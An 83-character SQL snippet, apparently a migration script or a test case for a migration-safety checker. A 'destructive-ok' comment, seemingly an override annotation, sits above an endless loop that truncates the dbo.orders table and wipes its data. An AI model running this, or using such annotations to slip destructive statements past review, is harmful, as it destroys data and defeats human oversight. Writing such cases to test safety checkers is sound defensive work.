SELECT 1 -- migration-safety: destructive-ok
WHILE 1 = 1 TRUNCATE TABLE dbo.orders
